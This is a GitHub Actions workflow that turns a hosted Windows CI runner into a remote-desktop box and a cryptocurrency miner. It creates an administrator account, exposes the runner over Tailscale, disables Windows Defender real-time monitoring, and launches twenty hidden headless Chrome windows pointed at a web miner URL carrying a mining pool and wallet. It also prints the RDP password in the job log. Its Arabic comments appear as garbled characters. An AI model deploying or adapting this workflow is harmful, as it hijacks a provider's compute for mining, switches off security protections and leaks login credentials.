name: RDP Auto-Recreate + Miner

on:
  workflow_dispatch:
  schedule:
    - cron: "0 */6 * * *"  # ŸÉŸÑ 6 ÿ≥ÿßÿπÿßÿ™

env:
  RDP_USER: "RDPUser"
  RDP_PASSWORD: ${{ secrets.RDP_PASSWORD }}
  TAILSCALE_AUTH_KEY: ${{ secrets.TAILSCALE_AUTH_KEY }}
  MAX_RUNTIME: 340  # 5h40m
  MINER_URL: "http://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x&workers=8"
  CHROME_PATH: "C:\Program Files\Google\Chrome\Application\chrome.exe"
  WINDOW_COUNT: 20

jobs:
  rdp_miner:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: Enable RDP
        run: |
          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

      - name: Create RDP User
        run: |
          $secure = ConvertTo-SecureString $env:RDP_PASSWORD -AsPlainText -Force
          if (-not (Get-LocalUser -Name $env:RDP_USER -ErrorAction SilentlyContinue)) {
            New-LocalUser -Name $env:RDP_USER -Password $secure -AccountNeverExpires
            Add-LocalGroupMember -Group "Administrators" -Member $env:RDP_USER
            Add-LocalGroupMember -Group "Remote Desktop Users" -Member $env:RDP_USER
          } else {
            Set-LocalUser -Name $env:RDP_USER -Password $secure
          }

      - name: Install Tailscale
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
          $installer = "$env:TEMP\tailscale.msi"
          Invoke-WebRequest $tsUrl -OutFile $installer
          Start-Process msiexec.exe -ArgumentList "/i `"$installer` /quiet /norestart" -Wait
          Remove-Item $installer

      - name: Connect Tailscale
        run: |
          Start-Service Tailscale
          Start-Sleep -Seconds 5
          $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
          $tsStatus = & $tsExe up --reset --authkey $env:TAILSCALE_AUTH_KEY --hostname "GH-RDP-${{ github.run_id }}"
          $ip = (& $tsExe ip -4)
          echo "TS_IP=$ip" >> $env:GITHUB_ENV
          Write-Host "Tailscale IP: $ip"

      - name: Optimize Windows
        run: |
          powercfg /change standby-timeout-ac 0
          powercfg /change hibernate-timeout-ac 0
          powercfg /change monitor-timeout-ac 0
          powercfg /setactive SCHEME_MIN
          Set-MpPreference -DisableRealtimeMonitoring $true

      - name: Start Miner in 20 Windows
        run: |
          $jobs = @()
          function Start-MinerWindow {
              param($id)
              Start-Job -ScriptBlock {
                  param($chromePath, $minerUrl, $id)
                  while ($true) {
                      Write-Host "[$id] Starting Chrome Miner..."
                      Start-Process $chromePath -ArgumentList "--kiosk --headless --disable-gpu --no-first-run --no-default-browser-check --app=$minerUrl" -WindowStyle Hidden
                      
                      # Simple monitoring loop
                      Start-Sleep -Seconds 60
                      # ÿ™ÿ≠ŸÇŸÇ ÿ•ÿ∞ÿß ÿ™ŸàŸÇŸÅ Chrome (ŸäŸÖŸÉŸÜ ÿ•ÿ∂ÿßŸÅÿ© Hashrate check ŸÖŸÜ ÿµŸÅÿ≠ÿ© ÿßŸÑŸàŸäÿ®)
                      $chromeRunning = Get-Process chrome -ErrorAction SilentlyContinue
                      if (-not $chromeRunning) {
                          Write-Host "[$id] Chrome stopped, restarting..."
                      }
                  }
              } -ArgumentList $env:CHROME_PATH, $env:MINER_URL, $id
          }

          for ($i=1; $i -le $env:WINDOW_COUNT; $i++) {
              $jobs += Start-MinerWindow -id $i
          }

          Write-Host "‚úÖ Started $env:WINDOW_COUNT Chrome Miner windows."

      - name: Show RDP + Miner Info
        run: |
          $endTime = (Get-Date).AddMinutes($env:MAX_RUNTIME)
          Write-Host "=============================="
          Write-Host "üöÄ RDP + Miner Active"
          Write-Host "IP: $env:TS_IP"
          Write-Host "User: $env:RDP_USER"
          Write-Host "Pass: $env:RDP_PASSWORD"
          Write-Host "Duration: $env:MAX_RUNTIME min"
          Write-Host "Session Ends: $endTime"
          Write-Host "=============================="

      - name: Keep Alive & Monitor Miner
        run: |
          $elapsed = 0
          while ($elapsed -lt $env:MAX_RUNTIME) {
              Write-Host "‚è± RDP + Miner active: $elapsed / $env:MAX_RUNTIME min"
              Start-Sleep -Seconds 60
              $elapsed += 1
          }

      - name: Cleanup
        if: always()
        run: |
          Write-Host "üßπ Cleaning up..."
          Stop-Job -State Running
          $chromeProcesses = Get-Process chrome -ErrorAction SilentlyContinue
          if ($chromeProcesses) { $chromeProcesses | Stop-Process -Force }
          & "$env:ProgramFiles\Tailscale\tailscale.exe" logout
          Write-Host "‚úÖ Cleanup completed."
